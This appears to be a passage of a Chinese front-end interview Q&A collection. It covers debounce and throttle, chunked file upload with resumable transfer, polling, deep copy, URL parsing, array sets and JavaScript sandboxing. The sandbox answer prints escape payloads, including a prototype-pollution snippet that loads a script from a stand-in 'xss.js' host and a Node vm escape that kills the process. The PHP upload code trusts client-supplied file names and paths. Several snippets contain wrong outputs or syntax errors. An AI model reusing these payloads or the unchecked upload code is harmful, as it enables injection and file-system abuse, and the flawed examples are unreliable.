上面例子中的debounce就是防抖函数，在document中鼠标移动的时候，会在onmousemove最后触发的1s后执行回调函数testDebounce；如果我们一直在浏览器中移动鼠标（比如10s），会发现会在10 + 1s后才会执行testDebounce函数（因为clearTimeout(timer)），这个就是函数防抖。

在上面的代码中，会出现一个问题，var timer只能在setTimeout的父级作用域中，这样才是同一个timer，并且为了方便防抖函数的调用和回调函数fn的传参问题，我们应该用闭包来解决这些问题。

优化后的代码：

```js
function debounce(fn, delay) {
    var timer; // 维护一个 timer
    return function () {
        var _this = this; // 取debounce执行作用域的this
        var args = arguments;
        if (timer) {
            clearTimeout(timer);
        }
        timer = setTimeout(function () {
            fn.apply(_this, args); // 用apply指向调用debounce的对象，相当于_this.fn(args);
        }, delay);
    };
}
```

使用闭包后，解决传参和封装防抖函数的问题，这样就可以在其他地方随便将需要防抖的函数传入debounce了。

**节流：**

每隔一段时间，只执行一次函数。

- 定时器实现节流函数：

  ```js
  function throttle(fn, delay) {
      var timer;
      return function () {
          var _this = this;
          var args = arguments;
          if (timer) {
              return;
          }
          timer = setTimeout(function () {
              fn.apply(_this, args);
              timer = null; // 在delay后执行完fn之后清空timer，此时timer为假，throttle触发可以进入计时器
          }, delay)
      }
  }
  ```

- 时间戳实现节流函数：

  ```js
  function throttle(fn, delay) {
      var previous = 0;
      // 使用闭包返回一个函数并且用到闭包函数外面的变量previous
      return function() {
          var _this = this;
          var args = arguments;
          var now = new Date();
          if(now - previous > delay) {
              fn.apply(_this, args);
              previous = now;
          }
      }
  }
  ```

**异同比较**

相同点：

- 都可以通过使用 setTimeout 实现。
- 目的都是，降低回调执行频率。节省计算资源。

不同点：

- 函数防抖，在一段连续操作结束后，处理回调，**利用clearTimeout 和 setTimeout实现**。函数节流，在一段连续操作中，**每一段时间只执行一次**，频率较高的事件中使用来提高性能。
- 函数防抖关注一定时间连续触发的事件只在最后执行一次，而函数节流侧重于一段时间内只执行一次。

常见应用场景

**函数防抖的应用场景:**

连续的事件，只需触发一次回调的场景有：

- 搜索框搜索输入。只需用户最后一次输入完，再发送请求
- 手机号、邮箱验证输入检测
- 窗口大小Resize。只需窗口调整完成后，计算窗口大小。防止重复渲染。

函数节流的应用场景:

间隔一段时间执行一次回调的场景有：

- 滚动加载，加载更多或滚到底部监听
- 谷歌搜索框，搜索联想功能
- 高频点击提交，表单重复提交




### 44、文件异步上传怎么实现

**参考答案：**

#### 1.普通表单上传

使用PHP来展示常规的表单上传是一个不错的选择。首先构建文件上传的表单，并指定表单的提交内容类型为`enctype="multipart/form-data"`，表明表单需要上传二进制数据。

```html
<form action="/index.php" method="POST" enctype="multipart/form-data">
  <input type="file" name="myfile">
  <input type="submit">
</form>
```

然后编写`index.php`上传文件接收代码，使用`move_uploaded_file`方法即可(php大法好...)

```js
$imgName = 'IMG'.time().'.'.str_replace('image/','',$_FILES["myfile"]['type']);
$fileName =  'upload/'.$imgName;
// 移动上传文件至指定upload文件夹下，并根据返回值判断操作是否成功
if (move_uploaded_file($_FILES['myfile']['tmp_name'], $fileName)){
    echo $fileName;
}else {
    echo "nonn";
}
```

form表单上传大文件时，很容易遇见服务器超时的问题。通过xhr，前端也可以进行异步上传文件的操作，一般由两个思路。

#### 2.文件编码上传

第一个思路是将文件进行编码，然后在服务端进行解码，之前写过一篇在前端实现图片压缩上传的博客，其主要实现原理就是将图片转换成base64进行传递

```js
var imgURL = URL.createObjectURL(file);
ctx.drawImage(imgURL, 0, 0);
// 获取图片的编码，然后将图片当做是一个很长的字符串进行传递
var data = canvas.toDataURL("image/jpeg", 0.5); 
```

在服务端需要做的事情也比较简单，首先解码base64，然后保存图片即可

```js
$imgData = $_REQUEST['imgData'];
$base64 = explode(',', $imgData)[1];
$img = base64_decode($base64);
$url = './test.jpg';
if (file_put_contents($url, $img)) {
    exit(json_encode(array(
        url => $url
    )));
}
```

base64编码的缺点在于其体积比原图片更大（因为Base64将三个字节转化成四个字节，因此编码后的文本，会比原文本大出三分之一左右），对于体积很大的文件来说，上传和解析的时间会明显增加。

更多关于base64的知识，可以参考Base64笔记。

除了进行base64编码，还可以在前端直接读取文件内容后以二进制格式上传

```js
// 读取二进制文件
function readBinary(text){
   var data = new ArrayBuffer(text.length);
   var ui8a = new Uint8Array(data, 0);
   for (var i = 0; i < text.length; i++){ 
     ui8a[i] = (text.charCodeAt(i) & 0xff);
   }
   console.log(ui8a)
}

var reader = new FileReader();
reader.onload = function(){
    readBinary(this.result) // 读取result或直接上传
}
// 把从input里读取的文件内容，放到fileReader的result字段里
reader.readAsBinaryString(file);
```

#### 3.formData异步上传

FormData对象主要用来组装一组用 XMLHttpRequest发送请求的键/值对，可以更加灵活地发送Ajax请求。可以使用FormData来模拟表单提交。

```js
let files = e.target.files // 获取input的file对象
let formData = new FormData();
formData.append('file', file);
axios.post(url, formData);
```

服务端处理方式与直接form表单请求基本相同。

#### 4.iframe无刷新页面

在低版本的浏览器（如IE）上，xhr是不支持直接上传formdata的，因此只能用form来上传文件，而form提交本身会进行页面跳转，这是因为form表单的[target](https://developer.mozilla.org/zh-CN/docs/Web/HTML/Element/form)属性导致的，其取值有

- _self，默认值，在相同的窗口中打开响应页面

- _blank，在新窗口打开

- #### _parent，在父窗口打开

- _top，在最顶层的窗口打开

- `framename`，在指定名字的iframe中打开

如果需要让用户体验异步上传文件的感觉，可以通过`framename`指定iframe来实现。把form的target属性设置为一个看不见的iframe，那么返回的数据就会被这个iframe接受，因此只有该iframe会被刷新，至于返回结果，也可以通过解析这个iframe内的文本来获取。

```js
function upload(){
    var now = +new Date()
    var id = 'frame' + now
    $("body").append(`<iframe style="display:none;" name="${id}" id="${id}" />`);

    var $form = $("#myForm")
    $form.attr({
        "action": '/index.php',
        "method": "post",
        "enctype": "multipart/form-data",
        "encoding": "multipart/form-data",
        "target": id
    }).submit()

    $("#"+id).on("load", function(){
        var content = $(this).contents().find("body").text()
        try{
            var data = JSON.parse(content)
        }catch(e){
            console.log(e)
        }
    })
}
```

**扩展：**

**大文件上传**

现在来看看在上面提到的几种上传方式中实现大文件上传会遇见的超时问题，

- 表单上传和iframe无刷新页面上传，实际上都是通过form标签进行上传文件，这种方式将整个请求完全交给浏览器处理，当上传大文件时，可能会遇见请求超时的情形
- 通过fromData，其实际也是在xhr中封装一组请求参数，用来模拟表单请求，无法避免大文件上传超时的问题
- 编码上传，我们可以比较灵活地控制上传的内容

大文件上传最主要的问题就在于：**在同一个请求中，要上传大量的数据，导致整个过程会比较漫长，且失败后需要重头开始上传**。试想，如果我们将这个请求拆分成多个请求，每个请求的时间就会缩短，且如果某个请求失败，只需要重新发送这一次请求即可，无需从头开始，这样是否可以解决大文件上传的问题呢？

综合上面的问题，看来大文件上传需要实现下面几个需求

- 支持拆分上传请求(即切片)
- 支持断点续传
- 支持显示上传进度和暂停上传

接下来让我们依次实现这些功能，看起来最主要的功能应该就是切片了。

**文件切片**

编码方式上传中，在前端我们只要先获取文件的二进制内容，然后对其内容进行拆分，最后将每个切片上传到服务端即可。

在JavaScript中，文件FIle对象是Blob对象的子类，Blob对象包含一个重要的方法slice，通过这个方法，我们就可以对二进制文件进行拆分。

下面是一个拆分文件的示例

```js
function slice(file, piece = 1024 * 1024 * 5) {
 let totalSize = file.size; // 文件总大小
 let start = 0; // 每次上传的开始字节
 let end = start + piece; // 每次上传的结尾字节
 let chunks = []
 while (start < totalSize) {
 // 根据长度截取每次需要上传的数据
 // File对象继承自Blob对象，因此包含slice方法
 let blob = file.slice(start, end); 
 chunks.push(blob)
 start = end;
 end = start + piece;
 }
 return chunks
}
```

将文件拆分成piece大小的分块，然后每次请求只需要上传这一个部分的分块即可

```js
let file = document.querySelector("[name=file]").files[0];
const LENGTH = 1024 * 1024 * 0.1;
let chunks = slice(file, LENGTH); // 首先拆分切片
chunks.forEach(chunk=>{
 let fd = new FormData();
 fd.append("file", chunk);
 post('/mkblk.php', fd)
})
```

服务器接收到这些切片后，再将他们拼接起来就可以了，下面是PHP拼接切片的示例代码

```js
$filename = './upload/' . $_POST['filename'];//确定上传的文件名
//第一次上传时没有文件，就创建文件，此后上传只需要把数据追加到此文件中
if(!file_exists($filename)){
 move_uploaded_file($_FILES['file']['tmp_name'],$filename);
}else{
 file_put_contents($filename,file_get_contents($_FILES['file']['tmp_name']),FILE_APPEND);
 echo $filename;
}
```

测试时记得修改nginx的server配置，否则大文件可能会提示413 Request Entity Too Large的错误。

```js
server {
  // ...
  client_max_body_size 50m;
}
```

上面这种方式来存在一些问题

- 无法识别一个切片是属于哪一个切片的，当同时发生多个请求时，追加的文件内容会出错
- 切片上传接口是异步的，无法保证服务器接收到的切片是按照请求顺序拼接的

因此接下来我们来看看应该如何在服务端还原切片。

**还原切片**

在后端需要将多个相同文件的切片还原成一个文件，上面这种处理切片的做法存在下面几个问题

- 如何识别多个切片是来自于同一个文件的，这个可以在每个切片请求上传递一个相同文件的context参数
- 如何将多个切片还原成一个文件
- 确认所有切片都已上传，这个可以通过客户端在切片全部上传后调用mkfile接口来通知服务端进行拼接
- 找到同一个context下的所有切片，确认每个切片的顺序，这个可以在每个切片上标记一个位置索引值
- 按顺序拼接切片，还原成文件

上面有一个重要的参数，即context，我们需要获取为一个文件的唯一标识，可以通过下面两种方式获取

- 根据文件名、文件长度等基本信息进行拼接，为了避免多个用户上传相同的文件，可以再额外拼接用户信息如uid等保证唯一性
- 根据文件的二进制内容计算文件的hash，这样只要文件内容不一样，则标识也会不一样，缺点在于计算量比较大.

修改上传代码，增加相关参数

```js
// 获取context，同一个文件会返回相同的值
function createContext(file) {
  return file.name + file.length
}
let file = document.querySelector("[name=file]").files[0];
const LENGTH = 1024 * 1024 * 0.1;
let chunks = slice(file, LENGTH);
// 获取对于同一个文件，获取其的context
let context = createContext(file);
let tasks = [];
chunks.forEach((chunk, index) => {
 let fd = new FormData();
 fd.append("file", chunk);
 // 传递context
 fd.append("context", context);
 // 传递切片索引值
 fd.append("chunk", index + 1);

 tasks.push(post("/mkblk.php", fd));
});
// 所有切片上传完毕后，调用mkfile接口
Promise.all(tasks).then(res => {
 let fd = new FormData();
 fd.append("context", context);
 fd.append("chunks", chunks.length);
 post("/mkfile.php", fd).then(res => {
 console.log(res);
 });
});
```

在mkblk.php接口中，我们通过context来保存同一个文件相关的切片

```js
// mkblk.php
$context = $_POST['context'];
$path = './upload/' . $context;
if(!is_dir($path)){
 mkdir($path);
}
// 把同一个文件的切片放在相同的目录下
$filename = $path .'/'. $_POST['chunk'];
$res = move_uploaded_file($_FILES['file']['tmp_name'],$filename);
```

除了上面这种简单通过目录区分切片的方法之外，还可以将切片信息保存在数据库来进行索引。接下来是mkfile.php接口的实现，这个接口会在所有切片上传后调用

```js
// mkfile.php
$context = $_POST['context'];
$chunks = (int)$_POST['chunks'];
//合并后的文件名
$filename = './upload/' . $context . '/file.jpg'; 
for($i = 1; $i <= $chunks; ++$i){
 $file = './upload/'.$context. '/' .$i; // 读取单个切块
 $content = file_get_contents($file);
 if(!file_exists($filename)){
 $fd = fopen($filename, "w+");
 }else{
 $fd = fopen($filename, "a");
 }
 fwrite($fd, $content); // 将切块合并到一个文件上
}
echo $filename;
```

这样就解决了上面的两个问题：

- 识别切片来源
- 保证切片拼接顺序

**断点续传**

即使将大文件拆分成切片上传，我们仍需等待所有切片上传完毕，在等待过程中，可能发生一系列导致部分切片上传失败的情形，如网络故障、页面关闭等。由于切片未全部上传，因此无法通知服务端合成文件。这种情况下可以通过**断点续传**来进行处理。

断点续传指的是：可以从已经上传部分开始继续上传未完成的部分，而没有必要从头开始上传，节省上传时间。

由于整个上传过程是按切片维度进行的，且mkfile接口是在所有切片上传完成后由客户端主动调用的，因此断点续传的实现也十分简单：

- 在切片上传成功后，保存已上传的切片信息
- 当下次传输相同文件时，遍历切片列表，只选择未上传的切片进行上传
- 所有切片上传完毕后，再调用mkfile接口通知服务端进行文件合并

因此问题就落在了如何保存已上传切片的信息了，保存一般有两种策略

- 可以通过locaStorage等方式保存在前端浏览器中，这种方式不依赖于服务端，实现起来也比较方便，缺点在于如果用户清除了本地文件，会导致上传记录丢失
- 服务端本身知道哪些切片已经上传，因此可以由服务端额外提供一个根据文件context查询已上传切片的接口，在上传文件前调用该文件的历史上传记录

下面让我们通过在本地保存已上传切片记录，来实现断点上传的功能

```js
// 获取已上传切片记录
function getUploadSliceRecord(context){
 let record = localStorage.getItem(context)
 if(!record){
 return []
 }else {
 try{
 return JSON.parse(record)
 }catch(e){}
 }
}
// 保存已上传切片
function saveUploadSliceRecord(context, sliceIndex){
 let list = getUploadSliceRecord(context)
 list.push(sliceIndex)
 localStorage.setItem(context, JSON.stringify(list))
}
```

然后对上传逻辑稍作修改，主要是增加上传前检测是已经上传、上传后保存记录的逻辑

```js
let context = createContext(file);
// 获取上传记录
let record = getUploadSliceRecord(context);
let tasks = [];
chunks.forEach((chunk, index) => {
 // 已上传的切片则不再重新上传
 if(record.includes(index)){
 return
 }

 let fd = new FormData();
 fd.append("file", chunk);
 fd.append("context", context);
 fd.append("chunk", index + 1);
 let task = post("/mkblk.php", fd).then(res=>{
 // 上传成功后保存已上传切片记录
 saveUploadSliceRecord(context, index)
 record.push(index)
 })
 tasks.push(task);
});
```

此时上传时刷新页面或者关闭浏览器，再次上传相同文件时，之前已经上传成功的切片就不会再重新上传了。

服务端实现断点续传的逻辑基本相似，只要在getUploadSliceRecord内部调用服务端的查询接口获取已上传切片的记录即可，因此这里不再展开。

此外断点续传还需要考虑**切片过期**的情况：如果调用了mkfile接口，则磁盘上的切片内容就可以清除掉了，如果客户端一直不调用mkfile的接口，放任这些切片一直保存在磁盘显然是不可靠的，一般情况下，切片上传都有一段时间的有效期，超过该有效期，就会被清除掉。基于上述原因，断点续传也必须同步切片过期的实现逻辑。

**上传进度和暂停**

通过xhr.upload中的progress方法可以实现监控每一个切片上传进度。

上传暂停的实现也比较简单，通过xhr.abort可以取消当前未完成上传切片的上传，实现上传暂停的效果，恢复上传就跟断点续传类似，先获取已上传的切片列表，然后重新发送未上传的切片。

由于篇幅关系，上传进度和暂停的功能这里就先不实现了。

### 45、使用setInterval请求实时数据，返回顺序不一致怎么解决

**参考答案：**

场景：

```js
setInterval(function() {
    $.get("/path/to/server", function(data, status) {
        console.log(data);
    });
}, 10000);
```

上面的程序会每隔10秒向服务器请求一次数据，并在数据到达后存储。这个实现方法通常可以满足简单的需求，然而同时也存在着很大的缺陷：在网络情况不稳定的情况下，服务器从接收请求、发送请求到客户端接收请求的总时间有可能超过10秒，而请求是以10秒间隔发送的，这样会导致接收的数据到达先后顺序与发送顺序不一致。

解决方案：

1. 使用setTimeout代替setInterval

   程序首先设置10秒后发起请求，当数据返回后再隔10秒发起第二次请求，以此类推。这样的话虽然无法保证两次请求之间的时间间隔为固定值，但是可以保证到达数据的顺序。

   ```js
   function poll() {
       setTimeout(function() {
           $.get("/path/to/server", function(data, status) {
               console.log(data);
               // 发起下一次请求
               poll();
           });
       }, 10000);
   }
   ```

2. WebSocket

   WebSocket 协议本质上是一个基于 TCP 的协议。

   为了建立一个 WebSocket 连接，客户端浏览器首先要向服务器发起一个 HTTP 请求，这个请求和通常的 HTTP 请求不同，包含了一些附加头信息，其中附加头信息"Upgrade: WebSocket"表明这是一个申请协议升级的 HTTP 请求，服务器端解析这些附加的头信息然后产生应答信息返回给客户端，客户端和服务器端的 WebSocket 连接就建立起来了，双方就可以通过这个连接通道自由的传递信息，**并且这个连接会持续存在直到客户端或者服务器端的某一方主动的关闭连接。**

   服务器（Node.js）：

   ```js
   var WebSocketServer = require('ws').Server;
   var wss = new WebSocketServer({port: 8080});
   
   wss.on("connection", function(socket) {
       socket.on("message", function(msg) {
           console.log(msg);
           socket.send("Nice to meet you!");
       });
   });
   ```

   客户端同样可以使用Node.js或者是浏览器实现，这里选用浏览器作为客户端：

   ```js
   // WebSocket 为客户端JavaScript的原生对象
   var ws = new WebSocket("ws://localhost:8080");
   ws.onopen = function (event) {
       ws.send("Hello there!");
   }
   ws.onmessage = function (event) {
       console.log(event.data);
   }
   ```



### 46、浅拷贝，深拷贝(实现方式)

**参考答案：**

浅拷贝和深拷贝都只针对于引用数据类型，浅拷贝只复制指向某个对象的指针，而不复制对象本身，新旧对象还是共享同一块内存；但深拷贝会另外创造一个一模一样的对象，新对象跟原对象不共享内存，修改新对象不会改到原对象；

区别：浅拷贝只复制对象的第一层属性、深拷贝可以对对象的属性进行递归复制；

实现浅拷贝方法

（1）Object.assign方法

```js
var obj = {
    a: 1,
    b: 2
}
var obj1 = Object.assign({},obj);
boj1.a = 3;
console.log(obj.a) // 3
```

（2）for in方法

```js
// 只复制第一层的浅拷贝
function simpleCopy(obj1) {
   var obj2 = Array.isArray(obj1) ? [] : {};
   for (let i in obj1) {
   obj2[i] = obj1[i];
  }
   return obj2;
}
var obj1 = {
   a: 1,
   b: 2,
   c: {
         d: 3
      }
}
var obj2 = simpleCopy(obj1);
obj2.a = 3;
obj2.c.d = 4;
alert(obj1.a); // 1
alert(obj2.a); // 3
alert(obj1.c.d); // 4
alert(obj2.c.d); // 4
```

实现深拷贝方法

（1）采用递归去拷贝所有层级属性

```js
function deepClone(obj){
    let objClone = Array.isArray(obj)?[]:{};
    if(obj && typeof obj==="object"){
        for(key in obj){
            if(obj.hasOwnProperty(key)){
                //判断ojb子元素是否为对象，如果是，递归复制
                if(obj[key]&&typeof obj[key] ==="object"){
                    objClone[key] = deepClone(obj[key]);
                }else{
                    //如果不是，简单复制
                    objClone[key] = obj[key];
                }
            }
        }
    }
    return objClone;
}    
let a=[1,2,3,4],
    b=deepClone(a);
a[0]=2;
console.log(a,b);
```

（2）使用JSON.stringify和JSON.parse实现深拷贝：JSON.stringify把对象转成字符串，再用JSON.parse把字符串转成新的对象；

```js
function deepCopy(obj1){
    let _obj = JSON.stringify(obj1);
    let obj2 = JSON.parse(_obj);
    return obj2;
  }
    var a = [1, [1, 2], 3, 4];
    var b = deepCopy(a);
    b[1][0] = 2;
    alert(a); // 1,1,2,3,4
    alert(b); // 2,2,2,3,4
```

（3）热门的函数库lodash，也有提供_.cloneDeep用来做深拷贝；

```js
var _ = require('lodash');
var obj1 = {
    a: 1,
    b: { f: { g: 1 } },
    c: [1, 2, 3]
};
var obj2 = _.cloneDeep(obj1);
console.log(obj1.b.f === obj2.b.f);
// false
```



### 47、获取当前页面url

**参考答案：**

1. window.location.href (设置或获取整个 URL 为字符串)

```js
var test = window.location.href;
alert(test);
//  返回：http://i.cnblogs.com/EditPosts.aspx?opt=1
```

1. window.location.protocol (设置或获取 URL 的协议部分)

```js
var test = window.location.protocol;
alert(test);
//返回：http:
```

1. window.location.host (设置或获取 URL 的主机部分)

```js
var test = window.location.host;
alert(test);
//返回：i.cnblogs.com
```

1. window.location.port (设置或获取与 URL 关联的端口号码)

```js
var test = window.location.port;
alert(test);
//返回：空字符(如果采用默认的80端口 (update:即使添加了:80)，那么返回值并不是默认的80而是空字符)
```

1. window.location.pathname (设置或获取与 URL 的路径部分（就是文件地址）)

```js
var test = window.location.pathname;
alert(test);
//返回：/EditPosts.aspx
```

1. window.location.search (设置或获取 href 属性中跟在问号后面的部分)

```js
var test = window.location.search;
alert(test);
//返回：?opt=1
（PS：获得查询（参数）部分，除了给动态语言赋值以外，我们同样可以给静态页面，并使用javascript来获得相信应的参数值。）
```

1. window.location.hash (设置或获取 href 属性中在井号“#”后面的分段)

```js
var test = window.location.hash;
alert(test);
//返回：空字符(因为url中没有)
```

1. js获取url中的参数值*

   正则法

```js
 function getQueryString(name) {
          var reg = new RegExp('(^|&)' + name + '=([^&]*)(&|$)', 'i');
          var r = window.location.search.substr(1).match(reg);

          if (r != null) {
             return unescape(r[2]);
          }
          return null;
  }
// 这样调用：
alert(GetQueryString("参数名1"));
alert(GetQueryString("参数名2"));
alert(GetQueryString("参数名3"));
```

 split拆分法

```js
function GetRequest() {
         var url = location.search; //获取url中"?"符后的字串
         var theRequest = new Object();

         if (url.indexOf("?") != -1) {
                 var str = url.substr(1);
                 strs = str.split("&");
              for(var i = 0; i < strs.length; i ++) {
                      theRequest[strs[i].split("=")[0]] = unescape(strs[i].split("=")[1]);
               }
         }
     return theRequest;
 }
var Request = new Object();
Request = GetRequest();<br>// var id=Request["id"]; 
// var 参数1,参数2,参数3,参数N;
// 参数1 = Request['参数1'];
// 参数2 = Request['参数2'];
// 参数3 = Request['参数3'];
// 参数N = Request['参数N'];
```

 指定取
比如说一个url：[http://i.cnblogs.com/?j=js](https://link.jianshu.com/?t=http://i.cnblogs.com/?j=js), 我们想得到参数j的值，可以通过以下函数调用。

```js
function GetQueryString(name) { 
         var reg = new RegExp("(^|&)" + name + "=([^&]*)(&|$)", "i"); 
         var r = window.location.search.substr(1).match(reg); //获取url中"?"符后的字符串并正则匹配
         var context = ""; 

     if (r != null) 
     context = r[2]; 
    reg = null; 
    r = null; 
    return context == null || context == "" || context == "undefined" ? "" : context; 
 }
alert(GetQueryString("j"));
```

 单个参数的获取方法

```js
function GetRequest() {
         var url = location.search; //获取url中"?"符后的字串
         if (url.indexOf("?") != -1) {? //判断是否有参数
                  var str = url.substr(1); //从第一个字符开始 因为第0个是?号 获取所有除问号的所有符串
                  strs = str.split("=");? //用等号进行分隔 （因为知道只有一个参数 
                                          //所以直接用等号进分隔 如果有多个参数 要用&号分隔 再用等号进行分隔）
                  alert(strs[1]);???? //直接弹出第一个参数 （如果有多个参数 还要进行循环的）
         }
  }
```





### 48、js中两个数组怎么取交集+(差集、并集、补集)

#### ES5：

交集：

```js
let arr1 = [1, 2, 3, 4, 5, 6];
let arr2 = [3, 4, 5, 6, 7, 8, 9];
function getIntersection(arr1, arr2) {
  let newArr = arr1.filter((item) => {
    console.log(arr2.indexOf(item));
    return arr2.indexOf(item) > -1
  });
  return newArr;
}
// console.log(getIntersection(arr1, arr2));


```

并集：

```js
function getSet(arr1, arr2) {
  let newArr = arr2.filter((item) => {
    return arr1.indexOf(item) == -1;
  });
  return arr1.concat(newArr);
}
console.log(getSet(arr1, arr2));

```

补集：

```js
function getComplement(arr1, arr2) {
  let newArr1 = arr1.filter((item) => {
    return arr2.indexOf(item) == -1;
  });
  let newArr2 = arr2.filter((item) => {
    return arr1.indexOf(item) == -1;
  });
  return newArr1.concat(newArr2);
}
```



#### ES6：

交集：

```js
let arr1 = [1, 2, 3, 4, 5, 6];
let arr2 = [3, 4, 5, 6, 7, 8, 9];

function getIntersection(arr1, arr2) {
  let y = new Set(arr2);
  return arr1.filter((x) => y.has(x));
}
console.log(getIntersection(arr1, arr2));

```



并集：

```js
let arr1 = [1, 2, 3, 4, 5, 6];
let arr2 = [3, 4, 5, 6, 7, 8, 9];
function getSet(arr1, arr2) {
  let x = arr1.concat(arr2);
  return [...new Set(x)];
}
console.log(getSet(arr1, arr2));

```



### 49、~~沙箱隔离怎么做的什么原理~~

**参考答案：**

沙箱，即sandbox，顾名思义，就是让你的程序跑在一个隔离的环境下，不对外界的其他程序造成影响，通过创建类似沙盒的独立作业环境，在其内部运行的程序并不能对硬盘产生永久性的影响。

实现沙箱的三种方法

1. 借助with + new Function

首先从最简陋的方法说起，假如你想要通过eval和function直接执行一段代码，这是不现实的，因为代码内部可以沿着作用域链往上找，篡改全局变量，这是我们不希望的，所以你需要让沙箱内的变量访问都在你的监控范围内；不过，你可以使用with API，在with的块级作用域下，变量访问会优先查找你传入的参数对象，之后再往上找，所以相当于你变相监控到了代码中的“变量访问”：

```javascript
function compileCode (src) {    
  src = 'with (exposeObj) {' + src + '}'  
  return new Function('exposeObj', src)   
}
```

接下里你要做的是，就是暴露可以被访问的变量exposeObj，以及阻断沙箱内的对外访问。通过es6提供的proxy特性，可以获取到对对象上的所有改写：

```javascript
function compileCode (src) {    
  src = `with (exposeObj) { ${src} }` 
  return new Function('exposeObj', src)   
} 
function proxyObj(originObj){ 
    let exposeObj = new Proxy(originObj,{ 
        has:(target,key)=>{ 
            if(["console","Math","Date"].indexOf(key)>=0){  
                return target[key]  
            } 
            if(!target.hasOwnProperty(key)){  
                throw new Error(`Illegal operation for key ${key}`) 
            } 
            return target[key]  
        },
    })  
    return exposeObj  

} 
function createSandbox(src,obj){  
 let proxy = proxyObj(obj)  
 compileCode(src).call(proxy,proxy) //绑定this 防止this访问window 
}
```

通过设置has函数，可以监听到变量的访问，在上述代码中，仅暴露个别外部变量供代码访问，其余不存在的属性，都会直接抛出error。其实还存在get、set函数，但是如果get和set函数只能拦截到当前对象属性的操作，对外部变量属性的读写操作无法监听到，所以只能使用has函数了。接下来我们测试一下：

```javascript
const testObj = { 
    value:1,  
    a:{ 
        b:  
    } 
} 
createSandbox("value='haha';console.log(a)",testObj)
```

看起来一切似乎没有什么问题，但是问题出在了传入的对象，当调用的是console.log(a.b)的时候，has方法是无法监听到对b属性的访问的，假设所执行的代码是不可信的，这时候，它只需要通过a.b.**proto**就可以访问到Object构造函数的原型对象，再对原型对象进行一些篡改，例如将toString就能影响到外部的代码逻辑的。

```javascript
createSandbox(` 
a.b.__proto__.toString = ()=>{  
 new (()=>{}).constructor("var script = document.createElement('script'); 
 script.src = 'http://xss.js';
 script.type = 'text/javascript'; 
 document.body.appendChild(script);")() 
}
`,testObj)  
console.log(testObj.a.b.__proto__.toString())
```

例如上面所展示的代码，通过访问原型链的方式，实现了沙箱逃逸，并且篡改了原型链上的toString方法，一旦外部的代码执行了toString方法，就可以实现xss攻击，注入第三方代码；由于在内部定义执行的函数代码逻辑，仍然会沿着作用于链查找，为了绕开作用域链的查找，笔者通过访问箭头函数的constructor的方式拿到了构造函数Function，这个时候，Funtion内所执行的xss代码，在执行的时候，便不会再沿着作用域链往上找，而是直接在全局作用域下执行，通过这样的方式，实现了沙箱逃逸以及xss攻击。

你可能会想，如果我切断原型链的访问，是否就杜绝了呢？的确，你可以通过Object.create(null)的方式，传入一个不含有原型链的对象，并且让暴露的对象只有一层，不传入嵌套的对象，但是，即使是基本类型值，数字或字符串，同样也可以通过**proto**查找到原型链，而且，即使不传入对象，你还可以通过下面这种方式绕过：

```javascript
({}).__proto__.toString= ()=>{console.log(111)};
```

可见，new Function + with的这种沙箱方式，防君子不防小人，当然，你也可以通过对传入的code代码做代码分析或过滤？假如传入的代码不是按照的规定的数据格式（例如json），就直接抛出错误，阻止恶意代码注入，但这始终不是一种安全的做法。

1. 借助iframe实现沙箱

前面介绍一种劣质的、不怎么安全的方法构造了一个简单的沙箱，但是在前端最常见的方法，还是利用iframe来构造一个沙箱

```javascript
<iframe sandbox src="..."></iframe>
```

 但是这也会带来一些限制：

1. script脚本不能执行

2. 不能发送ajax请求

3. 不能使用本地存储，即localStorage,cookie等

4. 不能创建新的弹窗和window

5. 不能发送表单

6. 不能加载额外插件比如flash等

   不过别方，你可以对这个iframe标签进行一些配置：

   ![img](https://static.nowcoder.com/images/activity/2021jxy/front/images/p.png)

接下里你只需要结合postMessage API，将你需要执行的代码，和需要暴露的数据传递过去，然后和你的iframe页面通信就行了。

1）需要注意的是，在子页面中，要注意不要让执行代码访问到contentWindow对象，因为你需要调用contentWindow的postMessageAPI给父页面传递信息，假如恶意代码也获取到了contentWindow对象，相当于就拿到了父页面的控制权了，这个时候可大事不妙。

2）当使用postMessageAPI的时候，由于sandbox的origin默认为null，需要设置allow-same-origin允许两个页面进行通信，意味着子页面内可以发起请求，这时候需要防范好CSRF，允许了同域请求，不过好在，并没有携带上cookie。

3）当调用postMessageAPI传递数据给子页面的时候，传输的数据对象本身已经通过结构化克隆算法复制

简单的说，通过postMessageAPI传递的对象，已经由浏览器处理过了，原型链已经被切断，同时，传过去的对象也是复制好了的，占用的是不同的内存空间，两者互不影响，所以你不需要担心出现第一种沙箱做法中出现的问题。

1. nodejs中的沙箱

nodejs中使用沙箱很简单，只需要利用原生的vm模块，便可以快速创建沙箱，同时指定上下文。

```javascript
const vm = require('vm'); 
const x = 1;  
const sandbox = { x: 2 }; 
vm.createContext(sandbox); // Contextify the sandbox. 
const code = 'x += 40; var y = 17;';  
vm.runInContext(code, sandbox); 
console.log(sandbox.x); // 42 
console.log(sandbox.y); // 17 
console.log(x); // 1;   y is not defined.
```

vm中提供了runInNewContext、runInThisContext、runInContext三个方法，三者的用法有个别出入，比较常用的是runInNewContext和runInContext，可以传入参数指定好上下文对象。

但是vm是绝对安全的吗？不一定。

```javascript
const vm = require('vm'); 
vm.runInNewContext("this.constructor.constructor('return process')().exit()")
```

通过上面这段代码，我们可以通过vm，停止掉主进程nodejs，导致程序不能继续往下执行，这是我们不希望的，解决方案是绑定好context上下文对象，同时，为了避免通过原型链逃逸（nodejs中的对象并没有像浏览器端一样进行结构化复制，导致原型链依然保留），所以我们需要切断原型链，同时对于传入的暴露对象，只提供基本类型值。

```javascript
let ctx = Object.create(null);  
ctx.a = 1; // ctx上不能包含引用类型的属性 
vm.runInNewContext("this.constructor.constructor('return process')().exit()", ctx);
```

让我们来看一下TSW中是怎么使用的：

```javascript
const vm = require('vm'); 
const SbFunction = vm.runInNewContext('(Function)', Object.create(null));        // 沙堆  
... 
if (opt.jsonpCallback) {  
  code = `var result=null; var ${opt.jsonpCallback}=function($1){result=$1}; ${responseText}; return result;`;  
  obj = new SbFunction(code)(); 
}   
... 
```

通过runInNewContext返回沙箱中的构造函数Function，同时传入切断原型链的空对象防止逃逸，之后再外部使用的时候，只需要调用返回的这个函数，和普通的new Function一样调用即可。

### 53、闭包的理解

**参考答案：**

闭包：

 一个函数和对其周围状态（**lexical environment，词法环境**）的引用捆绑在一起（或者说函数被引用包围）， 这样的组合就是**闭包**（**closure**）。也就是说，闭包让你可以在一个内层函数中访问到其外层函数的作用域。在 JavaScript 中，每当创建一个函数，闭包就会在函数创建的同时被创建出来。

闭包的特点：

 让外部访问函数内部变量成为可能；
